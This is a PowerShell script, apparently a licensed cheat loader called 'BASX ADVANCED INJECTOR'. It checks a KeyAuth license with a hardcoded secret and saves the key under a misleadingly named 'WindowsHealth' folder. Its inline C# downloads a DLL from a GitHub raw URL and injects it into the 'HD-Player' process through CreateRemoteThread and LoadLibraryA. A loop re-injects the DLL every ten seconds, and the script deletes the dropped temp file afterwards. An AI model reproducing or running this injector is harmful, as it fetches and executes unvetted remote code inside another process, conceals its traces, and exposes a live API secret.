[Console]::OutputEncoding = [System.Text.Encoding]::UTF8
[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12

# --- KeyAuth Configuration ---
$Name    = "Relaxwtf777's Application"
$OwnerID = "W404AorT6U"
$Secret  = "bdd0ab6c75599fffdb5ad43d22a82fe8bf8fa0fbd92dfdfbb2df80dc6d105d38"
$Version = "1.0"

$dirPath    = "$env:LOCALAPPDATA\WindowsHealth"
$configPath = "$dirPath\auth.dat"
$dllUrl     = "https://raw.githubusercontent.com/relaxhaha56-maker/node-storage-33/main/winsky.dll"
$targetProc = "HD-Player"

function Show-Auth {
    param($savedKey = $null)
    Clear-Host
    Write-Host "==============================" -ForegroundColor Cyan
    Write-Host "    BASX ADVANCED INJECTOR    " -ForegroundColor Cyan
    Write-Host "==============================" -ForegroundColor Cyan
    
    $initUrl = "https://keyauth.win/api/1.2/?type=init&name=$($Name -replace ' ', '%20')&ownerid=$OwnerID&secret=$Secret&version=$Version"
    try {
        $initRes = Invoke-RestMethod -Uri $initUrl -Method Get
        $sessionId = $initRes.sessionid
    } catch { return $null }

    if ($null -ne $savedKey) { 
        $key = $savedKey 
        Write-Host "[*] Using saved license key..." -ForegroundColor Gray
    } else { 
        $key = Read-Host " Enter License Key" 
    }

    $hwid = (Get-CimInstance Win32_ComputerSystemProduct).UUID
    $loginUrl = "https://keyauth.win/api/1.2/?type=license&key=$key&hwid=$hwid&sessionid=$sessionId&name=$($Name -replace ' ', '%20')&ownerid=$OwnerID"
    
    try {
        $loginRes = Invoke-RestMethod -Uri $loginUrl -Method Get
        if ($loginRes.success -eq $true) {
            if (!(Test-Path $dirPath)) { New-Item -ItemType Directory -Path $dirPath -Force }
            $key | Out-File $configPath -Force
            return $true
        }
    } catch { }
    return $false
}

$currentKey = $null
if (Test-Path $configPath) { $currentKey = Get-Content $configPath }

if (Show-Auth -savedKey $currentKey) {
    Write-Host "[+] Login Success!" -ForegroundColor Green

    $Source = @"
    using System;
    using System.Runtime.InteropServices;
    using System.Diagnostics;
    using System.Text;
    using System.Net;
    using System.IO;

    public class MemoryNode {
        [DllImport("kernel32.dll")] public static extern IntPtr OpenProcess(int dw, bool b, int p);
        [DllImport("kernel32.dll")] public static extern IntPtr VirtualAllocEx(IntPtr h, IntPtr a, uint s, uint t, uint pr);
        [DllImport("kernel32.dll")] public static extern bool WriteProcessMemory(IntPtr h, IntPtr a, byte[] b, uint s, out IntPtr w);
        [DllImport("kernel32.dll", CharSet = CharSet.Auto)] public static extern IntPtr GetModuleHandle(string lp);
        [DllImport("kernel32", CharSet = CharSet.Ansi)] public static extern IntPtr GetProcAddress(IntPtr h, string p);
        [DllImport("kernel32.dll")] public static extern IntPtr CreateRemoteThread(IntPtr h, IntPtr at, uint st, IntPtr sr, IntPtr pa, uint f, IntPtr id);
        [DllImport("kernel32.dll")] public static extern bool ReadProcessMemory(IntPtr h, IntPtr a, byte[] b, int s, out int r);

        public static void StreamInject(string url, int pid) {
            try {
                WebClient wc = new WebClient();
                wc.Headers.Add("User-Agent", "Mozilla/5.0");
                byte[] dllBytes = wc.DownloadData(url);

                IntPtr hProc = OpenProcess(0x001F0FFF, false, pid);
                if (hProc == IntPtr.Zero) return;

                string tempFile = Path.Combine(Path.GetTempPath(), "idx_" + Guid.NewGuid().ToString().Substring(0,8) + ".tmp");
                File.WriteAllBytes(tempFile, dllBytes);

                IntPtr addr = VirtualAllocEx(hProc, IntPtr.Zero, (uint)tempFile.Length + 1, 0x3000, 0x40);
                IntPtr w;
                WriteProcessMemory(hProc, addr, Encoding.Default.GetBytes(tempFile), (uint)tempFile.Length + 1, out w);
                
                IntPtr loadLib = GetProcAddress(GetModuleHandle("kernel32.dll"), "LoadLibraryA");
                CreateRemoteThread(hProc, IntPtr.Zero, 0, loadLib, addr, 0, IntPtr.Zero);

                System.Threading.Thread.Sleep(1500);
                if (File.Exists(tempFile)) File.Delete(tempFile);
            } catch { }
        }

        public static bool IsPatternLocked(int pid, long address) {
            IntPtr hProc = OpenProcess(0x001F0FFF, false, pid);
            if (hProc == IntPtr.Zero) return true;
            byte[] buffer = new byte[4];
            int read;
            if (ReadProcessMemory(hProc, (IntPtr)address, buffer, 4, out read)) {
                return buffer[0] == 0xFF && buffer[1] == 0xFF;
            }
            return false;
        }
    }
"@
    Add-Type -TypeDefinition $Source

    Write-Host "[*] Monitoring process: $targetProc" -ForegroundColor Cyan
    while ($true) {
        $p = Get-Process $targetProc -ErrorAction SilentlyContinue
        if ($p) {
            # Check Memory Address 0x2EC
            if (![MemoryNode]::IsPatternLocked($p.Id, 0x2EC)) {
                Write-Host "[*] Pattern mismatch detected. Re-injecting..." -ForegroundColor Yellow
                [MemoryNode]::StreamInject($dllUrl, $p.Id)
                Write-Host "[+] $(Get-Date -Format 'HH:mm:ss') - Stream Injection Successful!" -ForegroundColor Green
            }
        }
        Start-Sleep -Seconds 10
    }
} else {
    Write-Host "[-] Authentication Failed." -ForegroundColor Red
}
